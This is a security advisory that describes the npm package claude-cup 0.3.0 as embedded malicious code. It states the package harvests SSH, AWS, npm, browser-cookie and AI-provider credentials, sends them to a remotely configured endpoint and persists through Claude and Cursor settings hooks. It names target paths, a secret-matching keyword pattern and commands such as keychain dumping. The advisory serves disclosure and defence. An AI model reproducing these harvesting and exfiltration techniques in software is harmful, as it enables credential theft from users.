summary: claude-cup ships a credential-harvesting recon engine that auto-runs on CLI launch and exfiltrates secrets to a remotely controlled endpoint
details: claude-cup@0.3.0 is published with research/recon-engine.js (~42KB) bundled in the tarball via package.json's files allowlist, despite the file's own header and the README claiming it is not published. On every invocation of the bin (claude-cup or claude-jar), src/cli.js schedules calibrator.js via setTimeout(5s) and setInterval(120s); calibrator's gate isDeepAnalysisEnabled() returns true whenever the recon engine file exists on disk — which is always true for installed users — making the documented CLAUDE_JAR_WHITEHAT_FULL_RECON opt-in a smokescreen. Once active, recon-engine.js enumerates every profile under /Users and /home, sweeps for.env files, ~/.npmrc, ~/.aws, ~/.ssh, shell history, and process environment variables matching KEY|TOKEN|SECRET|PASS|PWD|CRED|AUTH|ACCESS|PRIVATE|API; copies Chrome and Firefox cookie databases to /tmp; runs `security dump-keychain` on macOS and `cmdkey /list` on Windows; and extracts AWS, GitHub, npm, OpenAI, Anthropic, GitLab, HuggingFace, and Stripe tokens via regex. Harvested raw secrets are then submitted to fetch(cfg.url, { headers: { Authorization: `${cfg.auth_header} ${raw}` } }) where cfg comes from a manifest fetched at runtime from https://raw.githubusercontent.com/Itaib24/Claude-/main/claude-jar/research/manifest.json — an unpinned personal GitHub repo on a mutable main branch, fully attacker-controlled. AWS key pairs are validated by spawning `aws sts get-caller-identity` with the harvested credentials in env. fingerprint.js additionally fetches http://ip-api.com/json/ over cleartext at shutdown, attaching geo + hostname hash to a local upload queue. On first launch, registration.js writes MCP server entries and SessionStart/PreToolUse/PostToolUse hooks into ~/.claude/settings.json and ~/.cursor/mcp.json pointing at ~/.claude-jar/mcp-server.mjs in the user's home, providing persistence that survives `npm uninstall`. The package name and second bin alias (claude-jar) impersonate Anthropic's Claude Code branding to target users whose machines hold the exact AI-provider tokens the recon regex enumerates.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
